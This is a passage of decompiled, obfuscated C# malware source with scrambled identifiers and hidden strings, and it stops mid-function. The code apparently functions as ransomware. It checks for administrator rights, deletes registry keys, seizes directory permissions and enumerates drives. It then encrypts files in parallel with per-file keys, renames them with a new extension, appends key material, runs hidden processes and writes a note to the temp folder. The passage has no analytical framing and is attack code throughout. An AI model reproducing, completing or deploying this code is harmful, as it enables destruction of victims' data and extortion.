	public static void PqGDLlSfOjAxfa(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = dAXyboFAql(getString_0(107390931));
		processStartInfo.Arguments = getString_0(107390902) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool dfBOVDMYdNLmH(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string ChQyNeuqmgO(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void dVbLgGshjXnN()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = NcLuovKFaQKveac(getString_0(107390897));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(dAXyboFAql(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(dAXyboFAql(getString_0(107390279)));
					registryKey.DeleteSubKey(dAXyboFAql(getString_0(107390222)));
					registryKey.DeleteSubKey(dAXyboFAql(getString_0(107390237)));
					registryKey.DeleteSubKey(dAXyboFAql(getString_0(107390212)));
					registryKey.DeleteSubKey(dAXyboFAql(getString_0(107390931)));
					registryKey.DeleteSubKey(dAXyboFAql(getString_0(107390155)));
					registryKey.DeleteSubKey(dAXyboFAql(getString_0(107390126)));
					registryKey.Close();
				}
				string_ = NcLuovKFaQKveac(getString_0(107390141));
				registryKey = Registry.LocalMachine.OpenSubKey(dAXyboFAql(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(dAXyboFAql(getString_0(107390556)));
					registryKey.Close();
				}
				string_ = NcLuovKFaQKveac(getString_0(107390507));
				registryKey = Registry.LocalMachine.OpenSubKey(dAXyboFAql(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(dAXyboFAql(getString_0(107390556)));
					registryKey.Close();
				}
				string_ = NcLuovKFaQKveac(getString_0(107390507));
				registryKey = Registry.CurrentUser.OpenSubKey(dAXyboFAql(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(dAXyboFAql(getString_0(107390556)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			SyapfBslvXsCZq(dAXyboFAql(getString_0(107390522)), dAXyboFAql(getString_0(107390473)));
			SyapfBslvXsCZq(dAXyboFAql(getString_0(107390424)), dAXyboFAql(getString_0(107390415)));
			SyapfBslvXsCZq(dAXyboFAql(getString_0(107390424)), dAXyboFAql(getString_0(107389789)));
			SyapfBslvXsCZq(dAXyboFAql(getString_0(107389728)), dAXyboFAql(getString_0(107389679)));
		}
		catch
		{
		}
	}

	public static void iXEoarVznApjVqS(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(dAXyboFAql(getString_0(107389638)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void FoTKlZItqKuqTQ()
	{
		string string_ = NcLuovKFaQKveac(getString_0(107389581));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(dAXyboFAql(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(dAXyboFAql(getString_0(107390044)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void jDNtEuxKPmD()
	{
		SyapfBslvXsCZq(getString_0(107397207), dAXyboFAql(getString_0(107390011)));
		string text = dAXyboFAql(getString_0(107389817));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107390987) + text + getString_0(107390987) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397207);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void LdWnWgipDWiVy(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (geeOWbkDyamU)
			{
				try
				{
					File.AppendAllText(UvHPjcAlchtwE, getString_0(107389208) + string_0 + getString_0(107389199) + ex.Message + getString_0(107396663));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string QTpaEkHdBvx()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107393401);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107389110);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107389133))) ? getString_0(107389147) : getString_0(107389156));
				break;
			case 0:
				text = getString_0(107389138);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107389105);
				break;
			case 4:
				text = getString_0(107389124);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107389074) : getString_0(107389115));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107389082) : getString_0(107389087)) : getString_0(107389092)) : getString_0(107389069));
				break;
			case 10:
				text = getString_0(107389045);
				break;
			}
		}
		if (text != getString_0(107393401))
		{
			text = getString_0(107389040) + text;
			if (oSVersion.ServicePack != getString_0(107393401))
			{
				text = text + getString_0(107392515) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string BGydPYDssQtWd(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395309);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(dAXyboFAql(getString_0(107395276)));
				streamWriter.WriteLine(getString_0(107396663));
				streamWriter.WriteLine(dAXyboFAql(getString_0(107393290)));
				streamWriter.WriteLine(string_0);
			}
			else
			{
				File.AppendAllText(text, getString_0(107393212) + string_0);
			}
			return text;
		}
		catch (Exception ex)
		{
			if (geeOWbkDyamU)
			{
				try
				{
					File.AppendAllText(UvHPjcAlchtwE, getString_0(107389059) + ex.Message + getString_0(107396663));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void KsHJoxiFpq(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		HodDzwKVtgQ.nrgETWiaiUK CS_0024_003C_003E8__locals0 = new HodDzwKVtgQ();
		CS_0024_003C_003E8__locals0.kfhntlBdbyqlPyI = string_1;
		CS_0024_003C_003E8__locals0.tXqjlNtlAwegU = string_2;
		CS_0024_003C_003E8__locals0.cNqEjjpUqBHDJCycCC = string_3;
		CS_0024_003C_003E8__locals0.WVKUKadbJyEcF = string_4;
		JkKFSdXHCQ = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.cNqEjjpUqBHDJCycCC);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396480))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !PelwIoYLMluwkT.Contains(array[i].Name))
					{
						PelwIoYLMluwkT.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!PelwIoYLMluwkT.Contains(string_0[j]))
				{
					PelwIoYLMluwkT.Add(string_0[j]);
				}
			}
		}
		if (PelwIoYLMluwkT.Contains(dAXyboFAql(getString_0(107389482))) && HazSUKRRBl == getString_0(107396810))
		{
			PelwIoYLMluwkT.Remove(dAXyboFAql(getString_0(107389482)));
		}
		Parallel.ForEach(PelwIoYLMluwkT, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new HodDzwKVtgQ.nrgETWiaiUK();
			CS_0024_003C_003E8__locals0.IjsltDfwDzUt = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.HKWFUJQtGU = string_0;
			if (bLbMRmlIqKb && !QTpaEkHdBvx().Contains(HodDzwKVtgQ.getString_0(107389083)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						dfBOVDMYdNLmH(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.HKWFUJQtGU);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (HpbWCpkqwlpVpmb == HodDzwKVtgQ.getString_0(107396819))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					rsYOdvIgzWi(CS_0024_003C_003E8__locals0.HKWFUJQtGU, CS_0024_003C_003E8__locals0.IjsltDfwDzUt.kfhntlBdbyqlPyI, CS_0024_003C_003E8__locals0.IjsltDfwDzUt.WVKUKadbJyEcF, CS_0024_003C_003E8__locals0.IjsltDfwDzUt.tXqjlNtlAwegU, CS_0024_003C_003E8__locals0.IjsltDfwDzUt.cNqEjjpUqBHDJCycCC);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				rsYOdvIgzWi(CS_0024_003C_003E8__locals0.HKWFUJQtGU, CS_0024_003C_003E8__locals0.kfhntlBdbyqlPyI, CS_0024_003C_003E8__locals0.WVKUKadbJyEcF, CS_0024_003C_003E8__locals0.tXqjlNtlAwegU, CS_0024_003C_003E8__locals0.cNqEjjpUqBHDJCycCC);
			}
		});
	}

	public static void rsYOdvIgzWi(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107393401));
		List<string> list3 = list2;
		if (TOzFyVZevgZt == getString_0(107396267))
		{
			list = rdJZzJUJKNMo(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = sOyIZRPurmEXm.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((YmTiJprAuyeUnyd == getString_0(107396267) && !item.EndsWith(text)) || mfvCVNdCLAD.Contains(item))
				{
					continue;
				}
				if (NjvrgrwIrOwQYj == getString_0(107396810))
				{
					try
					{
						if (pWuXVNymRcRzH.WNolxFETYpyTdRCb(item))
						{
							pWuXVNymRcRzH.QbSCVVjTHjQf(item);
						}
					}
					catch
					{
					}
				}
				mfvCVNdCLAD.Add(item);
				if (!PYEHnBxJBpISsEZ.Contains(Path.GetDirectoryName(item)))
				{
					PYEHnBxJBpISsEZ.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (JxuqTkcAaBSWi == getString_0(107396810) && fileStream.Length > Convert.ToInt32(LSeqdHjjsVhLqcK) * 1024 * 1024 && !list3.Contains(text))
					{
						if (pXuFbktiBaug == getString_0(107396810))
						{
							foreach (string item2 in eiWezuyCGKD)
							{
								if (item.ToLower().EndsWith(item2) && xhUXlAlyfax == getString_0(107396810))
								{
									if (Convert.ToInt32(LglvkdAEDeokrPA) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											jJNOnNgWhS.BqAVxlRXrfWmNzV(getString_0(107393450), getString_0(107393477), getString_0(107393432), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && xhUXlAlyfax == getString_0(107396267))
								{
									try
									{
										jJNOnNgWhS.BqAVxlRXrfWmNzV(getString_0(107393450), getString_0(107393477), getString_0(107393432), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = YQWUSoctiyTfY.LoatnGvftUwX(item, Convert.ToInt32(LSeqdHjjsVhLqcK) * 1024 * 1024);
						byte[] evuIFAZTaVnqAXFR = YQWUSoctiyTfY.PweaAYgfrHWgvSL(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						YQWUSoctiyTfY.cPwpfRLVLwkR(item, evuIFAZTaVnqAXFR);
						if (string_2 != getString_0(107389505))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107389505))
					{
						ppKdIUxBNAL(item, item + string_2, JkKFSdXHCQ);
					}
					else
					{
						ppKdIUxBNAL(item, item + getString_0(107389500), JkKFSdXHCQ);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void lehKMWZapuz(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		iOicLYfXayCEbJ.tUsqmcfKvfUs CS_0024_003C_003E8__locals0 = new iOicLYfXayCEbJ();
		CS_0024_003C_003E8__locals0.sgLbAoBHxjjEl = list_0;
		CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX = string_1;
		CS_0024_003C_003E8__locals0.sIKBGqcsXgr = string_2;
		CS_0024_003C_003E8__locals0.OFTUyyIDOSKVU = string_3;
		CS_0024_003C_003E8__locals0.KWOxGmriSwhi = new List<string> { getString_0(107393401) };
		if (YmTiJprAuyeUnyd == getString_0(107396267))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.sgLbAoBHxjjEl)
				{
					if (CS_0024_003C_003E8__locals0.sIKBGqcsXgr.Length != 0)
					{
						string[] sIKBGqcsXgr2 = CS_0024_003C_003E8__locals0.sIKBGqcsXgr;
						int num2 = 0;
						while (num2 < sIKBGqcsXgr2.Length)
						{
							string value2 = sIKBGqcsXgr2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_06c5;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX))
						{
							goto IL_06c5;
						}
					}
					catch (Exception)
					{
						goto IL_06c5;
					}
					if (item.EndsWith(string_0) && !mfvCVNdCLAD.Contains(item))
					{
						if (NjvrgrwIrOwQYj == iOicLYfXayCEbJ.getString_0(107396827))
						{
							try
							{
								if (pWuXVNymRcRzH.WNolxFETYpyTdRCb(item))
								{
									pWuXVNymRcRzH.QbSCVVjTHjQf(item);
								}
							}
							catch
							{
							}
						}
						mfvCVNdCLAD.Add(item);
						if (!PYEHnBxJBpISsEZ.Contains(Path.GetDirectoryName(item)))
						{
							PYEHnBxJBpISsEZ.Add(Path.GetDirectoryName(item));
						}
						LdWnWgipDWiVy(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00ef;
								}
								goto end_IL_00ef_2;
								end_IL_00ef:;
							}
							catch (Exception ex12)
							{
								if (geeOWbkDyamU)
								{
									try
									{
										File.AppendAllText(UvHPjcAlchtwE, iOicLYfXayCEbJ.getString_0(107389225) + item + iOicLYfXayCEbJ.getString_0(107406487) + ex12.Message + iOicLYfXayCEbJ.getString_0(107396680));
									}
									catch (Exception)
									{
									}
								}
								goto end_IL_00ef_2;
							}
							if (JxuqTkcAaBSWi == iOicLYfXayCEbJ.getString_0(107396827) && new FileInfo(item).Length > Convert.ToInt32(LSeqdHjjsVhLqcK) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.KWOxGmriSwhi.Contains(string_0))
							{
								CS_0024_003C_003E8__locals0 = new iOicLYfXayCEbJ.XbuYXBiSsEmiD();
								CS_0024_003C_003E8__locals0.itnzcOJuoNO = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX != iOicLYfXayCEbJ.getString_0(107389522))
									{
										File.Move(item, item + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX);
									}
								}
								catch (Exception ex14)
								{
									if (!geeOWbkDyamU)
									{
										break;
									}
									try
									{
										File.AppendAllText(UvHPjcAlchtwE, iOicLYfXayCEbJ.getString_0(107389225) + item + iOicLYfXayCEbJ.getString_0(107406906) + ex14.Message + iOicLYfXayCEbJ.getString_0(107396680));
										break;
									}
									catch (Exception)
									{
										break;
									}
								}
								CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw = iOicLYfXayCEbJ.getString_0(107393418);
								if (CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX != iOicLYfXayCEbJ.getString_0(107389522))
								{
									CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw = item + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX;
								}
								else
								{
									CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw = item;
								}
								if (pXuFbktiBaug == iOicLYfXayCEbJ.getString_0(107396827))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in eiWezuyCGKD)
										{
											if (CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.itnzcOJuoNO.TgZlbgeobaAUJX) && xhUXlAlyfax == iOicLYfXayCEbJ.XbuYXBiSsEmiD.getString_0(107396830))
											{
												if (Convert.ToInt32(LglvkdAEDeokrPA) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw).Length)
												{
													try
													{
														jJNOnNgWhS.BqAVxlRXrfWmNzV(iOicLYfXayCEbJ.XbuYXBiSsEmiD.getString_0(107393470), iOicLYfXayCEbJ.XbuYXBiSsEmiD.getString_0(107393497), iOicLYfXayCEbJ.XbuYXBiSsEmiD.getString_0(107393452), CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw.ToLower().EndsWith(item2) && xhUXlAlyfax == iOicLYfXayCEbJ.XbuYXBiSsEmiD.getString_0(107396287))
											{
												try
												{
													jJNOnNgWhS.BqAVxlRXrfWmNzV(iOicLYfXayCEbJ.XbuYXBiSsEmiD.getString_0(107393470), iOicLYfXayCEbJ.XbuYXBiSsEmiD.getString_0(107393497), iOicLYfXayCEbJ.XbuYXBiSsEmiD.getString_0(107393452), CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = luLsrRUpsgAuX.mhByoYlUVluy(32);
								string s3 = ntOxoEXCcs.TSaKwZntIBTq(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								byte[] array2 = null;
								byte[] byte_2 = YQWUSoctiyTfY.LoatnGvftUwX(CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw, Convert.ToInt32(LSeqdHjjsVhLqcK) * 1024 * 1024);
								YQWUSoctiyTfY.cPwpfRLVLwkR(EvuIFAZTaVnqAXFR: (!jwIpebsbuTtJKU) ? (HHLzNKWftxhcT ? YQWUSoctiyTfY.PweaAYgfrHWgvSL(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YQWUSoctiyTfY.PweaAYgfrHWgvSL(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.OFTUyyIDOSKVU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (HHLzNKWftxhcT ? SuHHuNKVUauxPEQ.TXbfqRrcSLbdJ(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : SuHHuNKVUauxPEQ.TXbfqRrcSLbdJ(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.OFTUyyIDOSKVU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), IUdoiJFmoLEExqz: CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw, BGqjlFsUzej: bytes3);
							}
							else
							{
								string text4 = luLsrRUpsgAuX.mhByoYlUVluy(32);
								string s4 = ntOxoEXCcs.TSaKwZntIBTq(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX != iOicLYfXayCEbJ.getString_0(107389522))
								{
									if (!aDzhxFxDvB)
									{
										if (!HHLzNKWftxhcT)
										{
											SzxhvEQrnUWoe(item, item + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX, JkKFSdXHCQ);
										}
										else
										{
											SzxhvEQrnUWoe(item, item + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!HHLzNKWftxhcT)
											{
												EHrKmISxBKusFz(item, item + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX, JkKFSdXHCQ);
											}
											else
											{
												EHrKmISxBKusFz(item, item + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (geeOWbkDyamU)
											{
												try
												{
													File.AppendAllText(UvHPjcAlchtwE, iOicLYfXayCEbJ.getString_0(107389225) + item + iOicLYfXayCEbJ.getString_0(107389476) + ex16.Message + iOicLYfXayCEbJ.getString_0(107396680));
												}
												catch (Exception)
												{
												}
											}
										}
									}
								}
								else if (!aDzhxFxDvB)
								{
									if (!HHLzNKWftxhcT)
									{
										SzxhvEQrnUWoe(item, item + iOicLYfXayCEbJ.getString_0(107389517), JkKFSdXHCQ);
									}
									else
									{
										SzxhvEQrnUWoe(item, item + iOicLYfXayCEbJ.getString_0(107389517), Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!HHLzNKWftxhcT)
										{
											EHrKmISxBKusFz(item, item, JkKFSdXHCQ);
										}
										else
										{
											EHrKmISxBKusFz(item, item, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (geeOWbkDyamU)
										{
											try
											{
												File.AppendAllText(UvHPjcAlchtwE, iOicLYfXayCEbJ.getString_0(107389225) + item + iOicLYfXayCEbJ.getString_0(107389476) + ex18.Message + iOicLYfXayCEbJ.getString_0(107396680));
											}
											catch (Exception)
											{
											}
										}
									}
								}
								if (HHLzNKWftxhcT)
								{
									if (CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX != iOicLYfXayCEbJ.getString_0(107389522))
									{
										iXEoarVznApjVqS(item + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX, bytes4);
									}
									else
									{
										iXEoarVznApjVqS(item, bytes4);
									}
								}
							}
							goto IL_06c5;
							end_IL_00ef_2:;
						}
						catch (Exception)
						{
							goto IL_06c5;
						}
					}
					continue;
					IL_06c5:
					CS_0024_003C_003E8__locals0.sgLbAoBHxjjEl.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.sgLbAoBHxjjEl, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new iOicLYfXayCEbJ.tUsqmcfKvfUs();
			CS_0024_003C_003E8__locals0.itnzcOJuoNO = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN = string_0;
			if (CS_0024_003C_003E8__locals0.sIKBGqcsXgr.Length != 0)
			{
				string[] sIKBGqcsXgr = CS_0024_003C_003E8__locals0.sIKBGqcsXgr;
				int num = 0;
				while (num < sIKBGqcsXgr.Length)
				{
					string value = sIKBGqcsXgr[num];
					if (!CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0748;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN.EndsWith(CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX))
				{
					goto IL_0748;
				}
			}
			catch (Exception)
			{
				goto IL_0748;
			}
			if (!mfvCVNdCLAD.Contains(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN))
			{
				if (NjvrgrwIrOwQYj == iOicLYfXayCEbJ.getString_0(107396827))
				{
					try
					{
						if (pWuXVNymRcRzH.WNolxFETYpyTdRCb(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN))
						{
							pWuXVNymRcRzH.QbSCVVjTHjQf(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
						}
					}
					catch
					{
					}
				}
				mfvCVNdCLAD.Add(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
				if (!PYEHnBxJBpISsEZ.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN)))
				{
					PYEHnBxJBpISsEZ.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN));
				}
				LdWnWgipDWiVy(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (geeOWbkDyamU)
						{
							try
							{
								File.AppendAllText(UvHPjcAlchtwE, iOicLYfXayCEbJ.getString_0(107389225) + CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + iOicLYfXayCEbJ.getString_0(107406487) + ex2.Message + iOicLYfXayCEbJ.getString_0(107396680));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_0117_2;
					}
					if (JxuqTkcAaBSWi == iOicLYfXayCEbJ.getString_0(107396827) && new FileInfo(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN).Length > Convert.ToInt32(LSeqdHjjsVhLqcK) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX != iOicLYfXayCEbJ.getString_0(107389522))
							{
								File.Move(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX);
							}
						}
						catch (Exception ex4)
						{
							if (geeOWbkDyamU)
							{
								try
								{
									File.AppendAllText(UvHPjcAlchtwE, iOicLYfXayCEbJ.getString_0(107389225) + CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + iOicLYfXayCEbJ.getString_0(107406906) + ex4.Message + iOicLYfXayCEbJ.getString_0(107396680));
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX != iOicLYfXayCEbJ.getString_0(107389522))
						{
							CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN += CS_0024_003C_003E8__locals0.TgZlbgeobaAUJX;
						}
						if (pXuFbktiBaug == iOicLYfXayCEbJ.getString_0(107396827))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in eiWezuyCGKD)
								{
									if (CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.itnzcOJuoNO.TgZlbgeobaAUJX) && xhUXlAlyfax == iOicLYfXayCEbJ.tUsqmcfKvfUs.getString_0(107396833))
									{
										if (Convert.ToInt32(LglvkdAEDeokrPA) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN).Length)
										{
											try
											{
												jJNOnNgWhS.BqAVxlRXrfWmNzV(iOicLYfXayCEbJ.tUsqmcfKvfUs.getString_0(107393473), iOicLYfXayCEbJ.tUsqmcfKvfUs.getString_0(107393500), iOicLYfXayCEbJ.tUsqmcfKvfUs.getString_0(107393455), CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN.ToLower().EndsWith(item3) && xhUXlAlyfax == iOicLYfXayCEbJ.tUsqmcfKvfUs.getString_0(107396290))
									{
										try
										{
											jJNOnNgWhS.BqAVxlRXrfWmNzV(iOicLYfXayCEbJ.tUsqmcfKvfUs.getString_0(107393473), iOicLYfXayCEbJ.tUsqmcfKvfUs.getString_0(107393500), iOicLYfXayCEbJ.tUsqmcfKvfUs.getString_0(107393455), CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
